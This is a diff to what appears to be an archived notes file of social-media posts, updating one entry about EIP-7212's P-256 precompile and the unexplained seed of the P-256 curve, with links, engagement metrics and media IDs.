@@ -1647,12 +5145,14 @@ Tags (automatic): AI-assisted hunting
 - URL: https://x.com/pcaversaccio/status/1715021011576320011
 - Metrics (at fetch): bookmark 9, impression 27315, like 98, quote 2, reply 4, retweet 9
 
-> 1/ ETH wouldn't exist w/o validated cryptographic primitives. Now, EIP-7212 introduces a P-256 (secp256r1 EC) precompile. But, for P256, the seed is c49d360886e704936a6678e1139d26b7819f7e90 and we still don’t know how it has been exactly calculated! We want to change that! https://t.co/bDIveDAo2Y https://t.co/HeyTyXWvIN
+> 1/ ETH wouldn't exist w/o validated cryptographic primitives. Now, EIP-7212 introduces a P-256 (secp256r1 EC) precompile. But, for P256, the seed is c49d360886e704936a6678e1139d26b7819f7e90 and we still don’t know how it has been exactly calculated! We want to change that! [pic.x.com/bDIveDAo2Y] https://twitter.com/merkleplant_eth/status/1715015864750342473
 
 **Media:**
 - media `3_1715018089685737472` (details not returned by the API)
 - media `3_1715018109319311360` (details not returned by the API)
 - media `3_1715018133235187712` (details not returned by the API)
+
+**Links in post:** https://twitter.com/merkleplant_eth/status/1715015864750342473
 
 **Quoted post** 1715015864750342473: not readable via the API (deleted, private, or withheld).
 
